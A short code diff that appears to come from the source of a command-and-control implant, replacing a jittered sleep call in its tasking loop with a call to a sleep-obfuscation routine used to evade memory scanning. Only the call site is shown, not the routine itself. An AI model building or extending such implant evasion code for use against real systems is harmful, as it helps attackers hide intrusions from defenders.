@@ -1,4 +1,5 @@
 #include "TaskController.h"
+#include "SleepObfMain.h"
 
 
 void TaskingRoutine() {
@@ -18,8 +19,7 @@ void TaskingRoutine() {
         if (!agent->session->Active)
             break;
         
-        //TODO implement encrypted sleep obfuscation.
-        Sleep((agent->config->SleepTime * 1000) + ((GenerateRandomNumber() % agent->config->SleepJitter) * 1000));
+        PerformSleepObf();
 
         if (ReachedKillDate()) {
             printf("[info] Kill date reached, exiting agent.\n");
